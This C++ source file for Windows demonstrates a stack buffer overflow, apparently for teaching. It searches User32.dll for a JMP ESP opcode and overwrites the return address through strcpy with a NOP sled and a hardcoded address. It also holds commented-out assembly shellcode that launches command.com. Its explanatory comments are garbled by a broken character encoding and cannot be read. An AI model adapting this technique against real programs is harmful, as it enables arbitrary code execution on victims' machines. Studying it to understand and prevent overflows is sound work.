
/***************************************************************************************
���������©��(Buffer Overflow Bug):
Դ����ĳЩ����(��strcat, strcpy��)���Ի������ı߽���м�飬������ݳ���ָ�����ȵĲ�����
����ĳЩ��Ҫ�ļĴ�����ַ�����ǣ������³�������ʧ�ܻ�ϵͳ�����������ʹ�������й�����ָ
���Ĵ��롣

ջ�еĴ洢���   ESP|...Local Buffer...|EBP|EIP

�����ַ����ṹ       ...NOP...NOP...NOP.....AAA...ShellCode...

��������߹����ض����ַ������θ���Buffer��EIP����EIP��ֵ���Ǳ��������õ�ĳ����ַ������
ִ�����̽�����������ָ���ĵ�ַAAA�������ʱEIPָ�򹥻�����д��ShellCode���룬���������
ʼִ�й���ָ�
***************************************************************************************/

#include <iostream.h>
#include <string.h>
#include <windows.h>
#include <stdlib.h>


void main()
{
	/*
	system("command.com");
	LoadLibrary("msvcrt.dll");
	__asm
	{
		mov esp,ebp                  ;��ebp�����ݸ�ֵ��esp
		push ebp                     ;����ebp
		mov ebp,esp                  ;��ebp����ֵ������Ϊ�ֲ������Ļ�ָ��
		xor edi,edi                  ;edi����
		push edi                     ;��ջ��ѹ��0��ͬʱesp-4�������ǹ����ַ����Ľ�β\0�ַ�
		sub esp,08h                  ;�������棬һ����12���ֽڣ�������"command.com"
		mov byte ptr [ebp-02h],6dh   ;'m'
		mov byte ptr [ebp-03h],6fh   ;'o'
		mov byte ptr [ebp-04h],63h   ;'c'
		mov byte ptr [ebp-05h],2Eh   ;'.'
		mov byte ptr [ebp-06h],64h   ;'d'
		mov byte ptr [ebp-07h],6eh   ;'n'
		mov byte ptr [ebp-08h],61h   ;'a'
		mov byte ptr [ebp-09h],6dh   ;'m'
		mov byte ptr [ebp-0ah],6dh   ;'m'
		mov byte ptr [ebp-0bh],6fh   ;'o'
		mov byte ptr [ebp-0ch],63h   ;'c'
		lea eax,[ebp-0ch]            ;ȡ�ô����׵�ַ
		push eax                     ;����ַ��Ϊ������ջ
		mov eax, 0x0040102d          ;��system�����ĵ�ַ����eax
		call eax                     ;����system
	}
	*/
	
/***************************************************************************************
NTϵͳΪÿ�����̷�����4GB�������ڴ�ռ�(0x00000000 ~ 0xffffffff)��EXE��ִ���ļ�ÿ������
ʱ�������ص��̶��ĵ�ַ�ռ�(��ʼ��ַ0x00401000)����DLL��̬���ӿ��ļ���ӳ��ÿ��Ҳ�����ص�
�̶��ĵ�ַ�ռ䣬���ڲ�ͬ��OS���ַ�ռ���ܲ�ͬ��
***************************************************************************************/
	
	//��User32.dll�ļ��ؿռ��в���ָ����ָ��ĵ�ַ��
	bool loaded = false; 
	HINSTANCE h; 
	TCHAR dllname[] = "User32.dll"; 
	h = ::GetModuleHandle(dllname);   //���Ѽ���User32.dll��ȡ������
	if(h == NULL)   //��û�������User32.dll
	{ 
		h = ::LoadLibrary(dllname); 
		if(h == NULL) 
		{ 
			cout<<"ERROR LOADING DLL: "<<dllname<<endl; 
		} 
		loaded = true; 
	}
	BYTE* ptr = (BYTE*)h; 
	bool done = false; 
	for(int y=0; !done; y++)   //��User32.dll���ڴ�ӳ��������ָ����ָ��
	{ 
		try 
		{
			if(ptr[y] == 0xFF && ptr[y+1] == 0xE4)   //FF E4 == JMP ESP
			{ 
				int pos = (int)ptr + y; 
				cout<<"OPCODE [FF E4] found - 0x"<<hex<<pos<<endl; 
			} 
		} 
		catch(...) 
		{ 
			cout<<"END OF "<<dllname<<" MEMORY REACHED"<<endl; 
			done = true; 
		} 
	} 
	//if(loaded) 
	//{
	//FreeLibrary(h); 
	//}
	
#define MAX_SIZE 8
	char buf[MAX_SIZE];
	
/***************************************************************************************
���ڳ����ջ���ʱESPָ��ShellCode����ôEIP���Բ�ֱ��ָ��ShellCode������ָ��ָ��JMP ESP
(������FF E4)�����Դ˴�EIP�Ǵ�User32.dll���ҵ���0x77d99323������ΪFF E4
***************************************************************************************/
	
	char input[MAX_SIZE+4+4+1] = {'\x90','\x90','\x90','\x90','\x90','\x90','\x90',
		'\x90','\x90','\x90','\x90','\x90','\x23','\x93','\xd9','\x77','\x00'};
	strcpy(buf, input);
	//::MessageBox(NULL, "Overflow Succeed", "Message", MB_OK);
	char szCaption[] = "Message";
	char szText[] = "Overflow Succeed";
	__asm
	{
		push MB_OK
		lea eax, szCaption
		push eax
		lea eax, szText
		push eax
		push NULL
		call dword ptr [MessageBox]
	}

//�˲��Դ���û��д��ShellCode�������ڻ������������EIPָ����һ��ָ�������Ȼ������������
}